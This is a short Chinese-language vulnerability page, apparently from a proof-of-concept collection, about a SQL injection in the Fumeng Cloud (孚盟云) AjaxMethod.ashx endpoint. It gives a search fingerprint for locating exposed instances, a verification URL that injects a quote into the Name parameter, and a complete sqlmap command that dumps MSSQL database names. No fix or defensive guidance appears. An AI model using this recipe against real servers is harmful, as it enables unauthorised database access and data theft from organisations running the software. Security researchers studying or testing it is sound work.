# 孚盟云 AjaxMethod.ashx SQL注入漏洞

## 漏洞描述

孚盟云 AjaxMethod.ashx文件存在SQL注入漏洞，攻击者通过漏洞可获取服务器权限

## 漏洞影响

<a-checkbox checked>孚盟云</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="孚盟云 "</a-checkbox></br>

## 漏洞复现

登录页面



![img](../../../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313131644740.png)



验证POC

```plain
http://xxx.xxx.xxx.xxx/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27
```

![img](../../../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313131644786.png)



使用Sqlmap

```plain
sqlmap -u "http://xxx.xxx.xxx.xxx/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y" -p Name --batch --random-agent --dbms mssql --dbs
```

![img](../../../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313131645297.png)